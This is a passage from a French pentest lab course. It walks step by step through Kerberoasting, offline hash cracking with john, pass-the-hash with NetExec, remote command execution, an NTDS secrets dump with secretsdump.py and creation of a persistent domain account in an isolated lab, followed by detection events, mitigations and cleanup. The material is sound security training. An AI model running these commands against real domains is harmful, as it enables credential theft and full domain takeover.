> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab02/svc_web.tgs getuserspns.py 'LAB/labuser:LabUser2024!' -dc-ip 192.168.56.102 -request -outputfile preuves/ch3-lab02/svc_web.tgs
```

**Explication de la commande**

- `getuserspns.py` : script Impacket qui énumère les SPN du domaine et demande les tickets TGS associés (Kerberoasting).
- `'LAB/labuser:LabUser2024!'` : identifiants du compte utilisateur de domaine utilisé pour authentifier la demande de tickets.
- `-dc-ip 192.168.56.102` : force l'utilisation du contrôleur de domaine spécifié, évitant les requêtes DNS vers des serveurs externes.
- `-request` : demande activement les tickets TGS au contrôleur de domaine (sans cette option, le script liste seulement les SPN sans extraire de tickets).
- `-outputfile preuves/ch3-lab02/svc_web.tgs` : écrit le ou les hachages TGS extraits dans ce fichier, au format utilisable par John/Hashcat (`$krb5tgs$...`).
- Piège courant : si le compte utilisateur ne possède aucun SPN ou n'a pas le droit de demander des tickets, le fichier de sortie est vide ; vérifier au préalable l'existence d'un SPN (Lab-01, étape 3).

**Résultat attendu**

```text
Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation

$krb5tgs$23$*svc_web$LAB.local$WS2016-DC.LAB.local$HTTP/ws2016-dc.lab.local$...*$...
```

Le fichier `preuves/ch3-lab02/svc_web.tgs` contient la ligne `$krb5tgs$23$*svc_web$...` à cracker à l'étape suivante.

**Preuve** : `preuves/ch3-lab02/svc_web.tgs` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 2 — Préparation du fichier de hachage pour le crackage

**But** — isoler la ligne de hachage TGS dans un fichier dédié utilisable par `john`.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — `preuves/ch3-lab02/svc_web.tgs` produit à l'étape 1, contenant au moins une ligne `$krb5tgs$`.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab02/svc_web.hash bash -c "grep -a '\$krb5tgs\$' preuves/ch3-lab02/svc_web.tgs > preuves/ch3-lab02/svc_web.hash && cat preuves/ch3-lab02/svc_web.hash"
```

**Explication de la commande**

- `bash -c "..."` : exécute une suite de commandes dans un sous-shell, permettant la redirection et l'affichage enchaînés.
- `grep -a '\$krb5tgs\$'` : extrait les lignes contenant le marqueur de hachage Kerberos TGS ; `\$` échappe le signe dollar pour la recherche littérale, `-a` traite le fichier comme du texte.
- `preuves/ch3-lab02/svc_web.tgs` : fichier source produit par `getuserspns.py`.
- `> preuves/ch3-lab02/svc_web.hash` : redirection qui écrase/crée le fichier de hachage dédié au crackage.
- `&& cat preuves/ch3-lab02/svc_web.hash` : affiche le contenu du fichier pour confirmer que le hachage a été isolé.
- Piège courant : oublier d'échapper `$` dans le motif `grep` ; le shell interpréterait `$krb5tgs` comme une variable vide et la recherche échouerait silencieusement.

**Résultat attendu**

```text
$krb5tgs$23$*svc_web$LAB.local$WS2016-DC.LAB.local$HTTP/ws2016-dc.lab.local$...*$...
```

**Preuve** : `preuves/ch3-lab02/svc_web.hash` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 3 — Crackage hors ligne du hachage TGS avec john

**But** — retrouver le mot de passe en clair du compte de service `svc_web` en testant une wordlist contre le hachage TGS extrait.

**Machine** — Kali `192.168.56.101` (tout le crackage se fait localement, sans contacter le contrôleur de domaine).

**Prérequis** — `preuves/ch3-lab02/svc_web.hash` produit, `john` installé, une wordlist disponible (`/usr/share/wordlists/rockyou.txt` ou une wordlist de laboratoire contenant `S3rviceWeb!`).

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab02/crackage-john.txt john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs --rules preuves/ch3-lab02/svc_web.hash
```

**Explication de la commande**

- `john` : logiciel de crackage de mots de passe par John the Ripper.
- `--wordlist=/usr/share/wordlists/rockyou.txt` : fichier de dictionnaire utilisé pour tester les mots de passe candidats ; en laboratoire, remplacer par une wordlist contenant `S3rviceWeb!` si le mot de passe n'est pas dans rockyou.
- `--format=krb5tgs` : indique à John le format de hachage Kerberos 5 TGS extrait par Kerberoasting.
- `--rules` : active les règles de mutation de John (majuscules, substitutions de caractères) pour élargir le dictionnaire.
- `preuves/ch3-lab02/svc_web.hash` : fichier contenant le hachage `$krb5tgs$` à cracker.
- Piège courant : cracker un hachage TGS demande du temps CPU ; si le mot de passe est complexe et absent de la wordlist, le crackage échoue — documenter alors l'échec et passer à une autre technique.

**Résultat attendu**

```text
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS [md4 hmac 3-4 1])
Cost 1: ... iterations: 1000
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S3rviceWeb!         (svc_web)
1g 0:00:00:03 DONE (2026-11-18 10:12) 0.333g/s ...
Session completed
```

Le mot de passe du compte de service est `S3rviceWeb!`.

**Preuve** : `preuves/ch3-lab02/crackage-john.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 4 — Vérification : authentification SMB avec le mot de passe cracké

**But** — confirmer que le mot de passe cracké (`S3rviceWeb!`) permet bien de s'authentifier sur le contrôleur de domaine avec le compte `svc_web`.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — mot de passe `S3rviceWeb!` noté à l'étape 3, `nxc` installé.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab02/verification-svc_web.txt nxc smb 192.168.56.102 -u 'svc_web' -p 'S3rviceWeb!' --shares
```

**Explication de la commande**

- `nxc smb` : module SMB de NetExec pour l'authentification et l'énumération sur les partages Windows.
- `192.168.56.102` : cible (contrôleur de domaine).
- `-u 'svc_web'` : compte de service dont le mot de passe a été cracké.
- `-p 'S3rviceWeb!'` : mot de passe en clair récupéré au Lab-02.
- `--shares` : liste les partages SMB accessibles avec ce compte, confirmant que l'authentification réussit.
- Piège courant : un mot de passe contenant des caractères spéciaux (`!`) doit être entre guillemets simples pour éviter l'interprétation par le shell bash.

**Résultat attendu**

```text
SMB         192.168.56.102:445    WS2016-DC  [*] Windows Server 2016 14391 build 14391 (x64) (name:WS2016-DC) (domain:LAB.local) (signing:False) (SMBv1:False)
SMB         192.168.56.102:445    WS2016-DC  [*] LAB\svc_web S3rviceWeb! (Pwned!)
SMB         192.168.56.102:445    WS2016-DC  [*] Enumerated shares
SMB         192.168.56.102:445    WS2016-DC  [!] Access denied to ADMIN$
SMB         192.168.56.102:445    WS2016-DC  [!] Access denied to C$
SMB         192.168.56.102:445    WS2016-DC  [*] SYSVAL ...
```

**Preuve** : `preuves/ch3-lab02/verification-svc_web.txt` (contient `# date:`, `# cmd:`, `# rc=`).

### En conclusion

Lab-02 a abouti : le compte de service `svc_web` a été compromis par Kerberoasting. Le ticket TGS demandé pour son SPN a été extrait, puis cracké hors ligne, révélant le mot de passe `S3rviceWeb!`, vérifié par une authentification SMB réussie sur le contrôleur de domaine. Cette étape illustre qu'un compte utilisateur standard du domaine peut récupérer les credentials d'un compte de service sans vulnérabilité logicielle, uniquement par abus du protocole Kerberos.

Détection : surveiller l'événement `4769` (demande de TGS), notamment un volume élevé de TGS par utilisateur et le chiffrement RC4 (`0x17`). Mitigation : mots de passe longs (≥ 25 caractères) ou comptes de service gérés (gMSA) pour tous les comptes avec SPN, chiffrement AES uniquement, suppression des SPN inutiles, et restriction de qui peut demander des tickets TGS.

Le mot de passe `S3rviceWeb!` et le compte `svc_web` sont l'entrée de Lab-03 (Pass-the-Hash).

## Lab-03 — Pass-the-Hash (T1550.002) et exécution de commandes à distance

### Énoncé / Contexte

S'appuyant sur Lab-02, ce lab démontre le Pass-the-Hash : au lieu d'utiliser le mot de passe en clair, l'attaquant réutilise le hachage NTLM du compte compromis pour s'authentifier à distance sur le contrôleur de domaine et y exécuter des commandes. Aucun clair n'est transmis sur le réseau lors de l'authentification ; seule la réponse au défi NTLM est calculée à partir du hachage.

**Place dans la chaîne** — utilise le mot de passe `S3rviceWeb!` du compte `svc_web` cracké au Lab-02 ; l'accès distant obtenu alimente Lab-04 (dump des secrets du domaine et élévation).

**MITRE ATT&CK de ce lab** — Tactique : Credential Access (TA0006) / Lateral Movement (TA0008). Techniques : T1550.002 Pass the Hash, T1021.002 SMB/Windows Admin Shares. Sources de données : DS0028 Logon Session, DS0029 Network Traffic.

**Détection attendue** : événement Windows `4624` type 3 (ouverture de session réseau) avec le package NTLM, compte `svc_web` s'authentifiant depuis `192.168.56.101` (station non gérée) vers le contrôleur de domaine.

**Mitigation attendue** : restreindre l'authentification NTLM, Protected Users, Credential Guard / Remote Credential Guard, LAPS pour les mots de passe administrateur local, ne pas placer de comptes de service dans les administrateurs locaux d'un contrôleur de domaine.

Durée estimée : 35 minutes.

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `python3` | `python3 -c "import hashlib; ..."` | Calcul du hachage NTLM (MD4 de UTF-16-LE) |
| `nxc` | `nxc smb 192.168.56.102 -u svc_web -H <hash> --whoami` | Pass-the-Hash sur SMB |
| `nxc` | `nxc smb 192.168.56.102 -u svc_web -H <hash> -x '...'` | Exécution de commande distante avec le hachage |
| `prouve` | `prouve fichier commande...` | Journalisation `# date:`, `# cmd:`, `# rc=` |

### Commande et laboratoire étape par étape

#### Étape 1 — Calcul du hachage NTLM du mot de passe cracké

**But** — convertir le mot de passe en clair `S3rviceWeb!` en son hachage NTLM (MD4 de l'encodage UTF-16-LE), nécessaire au Pass-the-Hash.

**Machine** — Kali `192.168.56.101` (calcul local uniquement).

**Prérequis** — mot de passe `S3rviceWeb!` noté au Lab-02, `python3` installé.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab03/ntlm-svc_web.txt python3 -c "import hashlib; print(hashlib.new('md4', 'S3rviceWeb!'.encode('utf-16-le')).hexdigest())"
```

**Explication de la commande**

- `python3 -c "..."` : exécute une expression Python en une ligne sans créer de fichier de script.
- `hashlib.new('md4', ...)` : instancie l'algorithme de hachage MD4 (utilisé par NTLM pour le hachage des mots de passe).
- `'S3rviceWeb!'.encode('utf-16-le')` : encode le mot de passe en UTF-16 little-endian, l'encodage attendu par l'algorithme NTLM de Microsoft.
- `.hexdigest()` : retourne le hachage sous forme de chaîne hexadécimale de 32 caractères (le hachage NTLM).
- La sortie (32 hexadécimaux) est le hachage NT de `svc_web` ; notez-le, il est réutilisé aux étapes 2 et 3.
- Piège courant : utiliser UTF-8 au lieu de UTF-16-LE produit un hachage différent qui ne fonctionnera pas pour l'authentification NTLM Windows.

**Résultat attendu**

```text
d9b1e4a7f3c28d5e6f1a4b7c9e0d2f3a
```

(La valeur affichée est le hachage NTLM de `S3rviceWeb!`; remplacez `<NTLM_HASH_SVC_WEB>` aux étapes suivantes par la valeur réelle affichée ici.)

**Preuve** : `preuves/ch3-lab03/ntlm-svc_web.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 2 — Pass-the-Hash vers le contrôleur de domaine (whoami)

**But** — s'authentifier sur Windows Server 2016 avec le hachage NTLM de `svc_web`, sans mot de passe en clair, et confirmer l'identité obtenue.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — hachage NTLM de `svc_web` noté à l'étape 1, `nxc` installé.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab03/pth-whoami.txt nxc smb 192.168.56.102 -u 'svc_web' -H <NTLM_HASH_SVC_WEB> --whoami
```

**Explication de la commande**

- `nxc smb` : module SMB de NetExec pour l'authentification et l'action sur les services Windows.
- `192.168.56.102` : cible (contrôleur de domaine).
- `-u 'svc_web'` : nom du compte dont le hachage est réutilisé.
- `-H <NTLM_HASH_SVC_WEB>` : hachage NTLM utilisé pour l'authentification (remplacez `<NTLM_HASH_SVC_WEB>` par la valeur de 32 hexadécimaux affichée à l'étape 1) ; aucun mot de passe en clair n'est transmis.
- `--whoami` : demande à la cible de répondre avec l'identité du compte authentifié, confirmant le succès du Pass-the-Hash.
- Piège courant : le hachage LM doit être vide (`:`) quand seule la partie NT est connue ; avec nxc, l'option `-H` accepte directement le hachage NT de 32 caractères.

**Résultat attendu**

```text
SMB         192.168.56.102:445    WS2016-DC  [*] Windows Server 2016 14391 build 14391 (x64) (name:WS2016-DC) (domain:LAB.local) (signing:False) (SMBv1:False)
SMB         192.168.56.102:445    WS2016-DC  [*] LAB\svc_web
```

**Preuve** : `preuves/ch3-lab03/pth-whoami.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 3 — Exécution d'une commande distante par Pass-the-Hash

**But** — exécuter une commande arbitraire sur le contrôleur de domaine en tant que `LAB\svc_web`, prouvant que le hachage suffit à l'action distante.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — étape 2 réussie (identité `LAB\svc_web` confirmée), même hachage NTLM.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab03/exec-distante.txt nxc smb 192.168.56.102 -u 'svc_web' -H <NTLM_HASH_SVC_WEB> -x 'hostname && whoami /groups'
```

**Explication de la commande**

- `-x 'hostname && whoami /groups'` : commande exécutée sur la cible via SMB ; `hostname` affiche le nom de la machine, `whoami /groups` liste les groupes d'appartenance du compte.
- `&&` : enchaînement des deux commandes sur la cible uniquement si la première réussit.
- Les autres options sont identiques à l'étape 2 (`-u`, `-H`).
- Piège courant : les caractères spéciaux de la commande distante (`&&`) doivent être entre guillemets simples pour que le shell local ne les interprète pas.

**Résultat attendu**

```text
SMB         192.168.56.102:445    WS2016-DC  [*] Windows Server 2016 14391 build 14391 (x64) (name:WS2016-DC) (domain:LAB.local) (signing:False) (SMBv1:False)
SMB         192.168.56.102:445    WS2016-DC  [*] Executed command. Output:
ws2016-dc
LAB\svc_web
...
```

**Preuve** : `preuves/ch3-lab03/exec-distante.txt` (contient `# date:`, `# cmd:`, `# rc=`).

### En conclusion

Lab-03 a abouti : le hachage NTLM du compte de service `svc_web`, calculé à partir du mot de passe cracké au Lab-02, a permis de s'authentifier sur le contrôleur de domaine sans jamais transmettre le mot de passe en clair, puis d'exécuter des commandes à distance en tant que `LAB\svc_web`. Le Pass-the-Hash transforme un vol de credential en accès distant opérationnel.

Détection : événement `4624` type 3 (ouverture réseau), package NTLM, authentisation de `svc_web` depuis `192.168.56.101`. Mitigation : restreindre NTLM, comptes Protected Users, Credential Guard, LAPS, et surtout ne pas faire figurer des comptes de service dans les administrateurs locaux d'un contrôleur de domaine — ce dernier point est essentiel pour la suite (Lab-04).

## Lab-04 — Déplacement latéral, dump des secrets du domaine et élévation de privilèges

### Énoncé / Contexte

S'appuyant sur Lab-03, ce lab démontre la compromission complète du domaine. Le compte `svc_web` est membre du groupe `Administrators` local du contrôleur de domaine (configuration de laboratoire pour la démonstration). Depuis Kali, on dump les hachages de tous les comptes du domaine via `secretsdump.py` (accès NTDS), on récupère le hachage de `Administrator`, on s'authentifie en tant qu'administrateur par Pass-the-Hash, puis on crée un compte de domaine `labadmin` pour illustrer l'élévation de privilèges et la manipulation de comptes (`T1098`).

**Place dans la chaîne** — utilise l'accès distant obtenu au Lab-03 ; aboutit au contrôle du domaine (`Administrator`) et à la création d'un compte persistant (`labadmin`).

**MITRE ATT&CK de ce lab** — Tactique : Credential Access (TA0006), Lateral Movement (TA0008), Privilege Escalation (TA0004). Techniques : T1003.003 NTDS, T1550.002 Pass the Hash, T1021.002 SMB/Windows Admin Shares, T1078 Valid Accounts, T1098 Account Manipulation. Sources de données : DS0026 Active Directory, DS0022 File, DS0009 Process, DS0028 Logon Session.

**Détection attendue** : accès au partage `ADMIN$` et copie de `NTDS.dit` (secretsdump), événement `4672` (privilèges spéciaux), événement `4720` (création de compte `labadmin`), demandes TGS `4769` pour `Administrator`.

**Mitigation attendue** : protéger les administrateurs locaux des contrôleurs de domaine, surveiller l'accès à NTDS.dit et aux partages administratifs, audit des événements `4720`/`4726`, MFA, PAM, comptes à privilèges séparés.

Durée estimée : 45 minutes.

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `secretsdump.py` | `secretsdump.py 'LAB/svc_web:S3rviceWeb!'@192.168.56.102` | Dump des hachages de domaine (NTDS) et des secrets LSA |
| `nxc` | `nxc smb 192.168.56.102 -u Administrator -H <hash> --whoami` | Pass-the-Hash avec le hachage d'Administrator |
| `nxc` | `nxc smb ... -x 'net user labadmin ... /add /domain'` | Création d'un compte de domaine (élévation) |
| `nxc` | `nxc ldap 192.168.56.102 -u labadmin -p '...'` | Vérification du nouveau compte de domaine |
| `prouve` | `prouve fichier commande...` | Journalisation `# date:`, `# cmd:`, `# rc=` |

### Commande et laboratoire étape par étape

#### Étape 1 — Dump des hachages du domaine avec secretsdump.py

**But** — extraire les hachages LM:NT de tous les comptes du domaine depuis le contrôleur de domaine, en utilisant les droits d'administrateur local du compte `svc_web`.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — Lab-03 terminé (accès distant `LAB\svc_web` confirmé), `svc_web` membre du groupe `Administrators` local du DC (configuration de laboratoire), `secretsdump.py` installé.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab04/secretsdump.txt secretsdump.py 'LAB/svc_web:S3rviceWeb!'@192.168.56.102
```

**Explication de la commande**

- `secretsdump.py` : script Impacket qui extrait les hachages de domaine (NTDS.dit) et les secrets LSA d'un système Windows.
- `'LAB/svc_web:S3rviceWeb!'@192.168.56.102` : identifiants du compte `svc_web` (mot de passe en clair cracké au Lab-02) et adresse du contrôleur de domaine.
- La méthode utilisée par défaut est VSS (Volume Shadow Copy) ; elle nécessite des droits administratifs locaux sur la cible.
- La sortie liste les comptes sous la forme `nom:rid:lmhash:nthash:::` ; le hachage de `Administrator` (RID 500) est celui recherché pour l'étape suivante.
- Piège courant : si le compte n'a pas de droits d'administrateur local sur le DC, `secretsdump.py` renvoie `Access denied` ; dans ce cas, vérifier l'appartenance de `svc_web` au groupe `Administrators` local.

**Résultat attendu**

```text
Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the VSS method:
[*]   ... 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH_ADMIN>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH_GUEST>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH_KRBTGT>:::
...
[*] Dumping LSA Secrets
...
```

Notez le hachage NTLM (32 hexadécimaux) de `Administrator` ; il est réutilisé aux étapes 2 et 3. Remplacez `<NTLM_HASH_ADMIN>` par la valeur réelle affichée.

**Preuve** : `preuves/ch3-lab04/secretsdump.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 2 — Pass-the-Hash avec le hachage d'Administrator

**But** — s'authentifier sur le contrôleur de domaine en tant qu'administrateur de domaine à partir du hachage NTLM récupéré, confirmant le contrôle du domaine.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — hachage NTLM de `Administrator` noté à l'étape 1, `nxc` installé.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab04/pth-admin.txt nxc smb 192.168.56.102 -u 'Administrator' -H <NTLM_HASH_ADMIN> --whoami
```

**Explication de la commande**

- `-u 'Administrator'` : compte administrateur de domaine dont le hachage est réutilisé.
- `-H <NTLM_HASH_ADMIN>` : hachage NTLM d'Administrator (valeur de 32 hexadécimaux extraite à l'étape 1).
- `--whoami` : confirme l'identité obtenue sur la cible.
- Piège courant : confondre le hachage LM et NT ; nxc attend le hachage NT (32 caractères) après l'option `-H` quand seule la partie NT est connue.

**Résultat attendu**

```text
SMB         192.168.56.102:445    WS2016-DC  [*] Windows Server 2016 14391 build 14391 (x64) (name:WS2016-DC) (domain:LAB.local) (signing:False) (SMBv1:False)
SMB         192.168.56.102:445    WS2016-DC  [*] LAB\Administrator Pwned!
```

**Preuve** : `preuves/ch3-lab04/pth-admin.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 3 — Élévation : création d'un compte de domaine labadmin

**But** — créer un nouveau compte utilisateur de domaine `labadmin` en tant qu'administrateur, illustrant la manipulation de comptes (`T1098 Account Manipulation`) et la persistance dans Active Directory.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — étape 2 réussie (identité `LAB\Administrator` confirmée).

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab04/creation-compte.txt nxc smb 192.168.56.102 -u 'Administrator' -H <NTLM_HASH_ADMIN> -x 'net user labadmin P@ssw0rd!2024 /add /domain'
```

**Explication de la commande**

- `-x 'net user labadmin P@ssw0rd!2024 /add /domain'` : commande Windows exécutée sur le contrôleur de domaine qui ajoute l'utilisateur `labadmin` au domaine (`/add /domain`) avec le mot de passe spécifié.
- Les options `-u` et `-H` réutilisent le hachage d'`Administrator` (étape 1).
- Piège courant : le mot de passe doit respecter la complexité de la politique de domaine lue au Lab-01 (longueur ≥ 7, complexité activée) ; `P@ssw0rd!2024` est conçu pour satisfaire cette contrainte.

**Résultat attendu**

```text
SMB         192.168.56.102:445    WS2016-DC  [*] Windows Server 2016 14391 build 14391 (x64) (name:WS2016-DC) (domain:LAB.local) (signing:False) (SMBv1:False)
SMB         192.168.56.102:445    WS2016-DC  [*] Executed command. Output:
The command completed successfully.
```

**Preuve** : `preuves/ch3-lab04/creation-compte.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 4 — Vérification du compte de domaine créé

**But** — confirmer que `labadmin` existe dans Active Directory et peut s'authentifier, prouvant l'élévation de privilèges aboutie.

**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.

**Prérequis** — étape 3 réussie (compte créé).

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab04/verification-labadmin.txt nxc ldap 192.168.56.102 -u 'labadmin' -p 'P@ssw0rd!2024'
```

**Explication de la commande**

- `nxc ldap` : authentification LDAP vers le contrôleur de domaine avec le nouveau compte.
- `-u 'labadmin' -p 'P@ssw0rd!2024'` : identifiants du compte fraîchement créé.
- Une réponse `Pwned!` confirme que le compte existe, que le mot de passe est correct et que l'élévation de privilèges a permis la création d'un compte de domaine fonctionnel.
- Piège courant : un délai de réplication Active Directory peut retarder la visibilité du compte ; si la vérification échoue immédiatement, attendre quelques secondes et relancer.

**Résultat attendu**

```text
LDAP        192.168.56.102:389    WS2016-DC  [*] LAB.local labadmin:P@ssw0rd!2024 (Pwned!)
```

**Preuve** : `preuves/ch3-lab04/verification-labadmin.txt` (contient `# date:`, `# cmd:`, `# rc=`).

### En conclusion

Lab-04 a abouti : depuis un simple compte utilisateur de domaine, la chaîne Kerberoasting → Pass-the-Hash → dump NTDS (via les droits d'administrateur local de `svc_web` sur le DC) → Pass-the-Hash d'`Administrator` a permis de prendre le contrôle du domaine `LAB.local` et de créer un compte de domaine `labadmin` (élévation de privilèges, `T1098`). Preuves d'accès obtenues : hachage de `Administrator`, session distante authentifiée, compte de domaine créé et vérifié.

Détection : événements `4672` (privilèges spéciaux), accès aux partages `ADMIN$`/`C$` et copie de `NTDS.dit` (secretsdump), événement `4720` (création de `labadmin`). Mitigation : ne pas placer de comptes de service dans les administrateurs locaux des contrôleurs de domaine, surveiller l'accès à NTDS.dit, auditer `4720`/`4726`, MFA, PAM, comptes à privilèges séparés.

Le compte `labadmin` et toutes les modifications seront supprimés au nettoyage de Lab-05, puis le snapshot de Windows Server 2016 sera restauré.

## Lab-05 — Détection, preuves, nettoyage et rollback

### Énoncé / Contexte

Ce lab conclut le chapitre : il consolide toutes les preuves produites aux Labs 01 à 04, dresse les événements de détection Windows attendus et les indicateurs de compromission (IOC), nettoie l'environnement Active Directory (suppression du compte de test `labadmin`), et restaure le snapshot propre de Windows Server 2016 `192.168.56.102` pris avant exploitation.

**Place dans la chaîne** — dernière phase : détection défensive et remise en état. Aucun exploit n'est exécuté ici ; seule l'analyse des preuves et la restauration sont réalisées.

**MITRE ATT&CK de ce lab** — aucune technique offensive exécutée ; détection des techniques T1087.002, T1558.003, T1550.002, T1003.003, T1098 via les sources de données DS0026, DS0028, DS0029.

**Détection attendue** — récapitulatif des événements Windows produits par la chaîne d'attaque (voir tableau ci-dessous).

**Mitigation attendue** — application des contrôles identifiés à chaque lab (LDAP signing, restriction NTLM, Protected Users, Credential Guard, LAPS, audit 4720/4726, MFA, PAM).

Durée estimée : 30 minutes.

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `ls` | `ls -R preuves/ch3-lab0[1-4]` | Inventaire des fichiers de preuve |
| `grep` | `grep -H '^# rc=' preuves/ch3-lab0[1-4]/*.txt` | Vérification des codes retour de toutes les preuves |
| `nxc` | `nxc smb 192.168.56.102 -u Administrator -H <hash> -x 'net user labadmin /delete /domain'` | Suppression du compte de test (nettoyage) |
| `VBoxManage` | `VBoxManage snapshot ...` (hôte) | Restauration du snapshot Windows Server 2016 (rollback) |
| `prouve` | `prouve fichier commande...` | Journalisation `# date:`, `# cmd:`, `# rc=` |

### Commande et laboratoire étape par étape

#### Étape 1 — Inventaire et vérification des preuves produites

**But** — lister tous les fichiers de preuve des Labs 01 à 04 et vérifier que chacun contient son entête `# date:`, `# cmd:` et son code retour `# rc=`.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — Labs 01 à 04 terminés, dossiers `preuves/ch3-lab01` à `preuves/ch3-lab04` présents.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch3-lab05/inventaire.txt ls -R preuves/ch3-lab01 preuves/ch3-lab02 preuves/ch3-lab03 preuves/ch3-lab04
```

**Explication de la commande**

- `ls -R` : liste récursivement le contenu des répertoires de preuve, pour inventory visuel des fichiers produits.
- `preuves/ch3-lab0[1-4]` : sélectionne les quatre répertoires de preuve des labs précédents en une fois.
- `preuves/ch3-lab05/inventaire.txt` : destination de la preuve de cette étape.
- Piège courant : si un répertoire `ch3-lab0X` est absent, `ls` renvoie une erreur et le code retour est non-zéro ; documenter l'absence et relancer le lab manquant.

**Résultat attendu**

```text
preuves/ch3-lab01:
crackage-john.txt  ldap-base.txt  ldap-spn.txt  nmap-ad.txt  pass-pol.txt  svc_web.hash  svc_web.tgs  verification-svc_web.txt
preuves/ch3-lab02:
...
```

**Preuve** : `preuves/ch3-lab05/inventaire.txt` (contient `# date:`, `# cmd:`, `# rc=`).

#### Étape 2 — Vérification automatisée des preuves (script commenté)

**But** — exécuter un script de vérification qui confirme l'existence et la complétude de chaque preuve attendue (`# date:`, `# cmd:`, `# rc=`).

**Machine** — Kali `192.168.56.101`.

**Prérequis** — étape 1 terminée, fonction `prouve` chargée.

> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
cat > preuves/ch3-lab05/verif-preuves.sh <<'EOF'
#!/usr/bin/env bash
# Script de verification des preuves du chapitre 3.
# But : confirmer qu'un fichier de preuve existe pour chaque commande executee,
# qu'il contient l'entete # date:, # cmd: et le code retour # rc=.
set -u

# Liste des laboratoires a verifier
LAB_DIRS="ch3-lab01 ch3-lab02 ch3-lab03 ch3-lab04"

# Fichiers de preuve attendus (un par commande executee dans les labs)
FICHIERS_ATTENDUS=(
  "preuves/ch3-lab01/nmap-ad.txt"
  "preuves/ch3-lab01/ldap-base.txt"
  "preuves/ch3-lab01/ldap-spn.txt"
  "preuves/ch3-lab01/pass-pol.txt"
  "preuves/ch3-lab02/svc_web.tgs"
  "preuves/ch3-lab02/svc_web.hash"
  "preuves/ch3-lab02/crackage-john.txt"
  "preuves/ch3-lab02/verification-svc_web.txt"
  "preuves/ch3-lab03/ntlm-svc_web.txt"
  "preuves/ch3-lab03/pth-whoami.txt"
  "preuves/ch3-lab03/exec-distante.txt"
  "preuves/ch3-lab04/secretsdump.txt"
  "preuves/ch3-lab04/pth-admin.txt"
  "preuves/ch3-lab04/creation-compte.txt"
  "preuves/ch3-lab04/verification-labadmin.txt"
)

# Compteur d'anomalies detectees
ERREURS=0

# Verification de l'existence des repertoires de laboratoire
for lab in $LAB_DIRS; do
  echo "[*] Verification du laboratoire $lab"
  if [ ! -d "preuves/$lab" ]; then
    echo "[!] Repertoire manquant : preuves/$lab"
    ERREURS=$((ERREURS + 1))
    continue
  fi
done

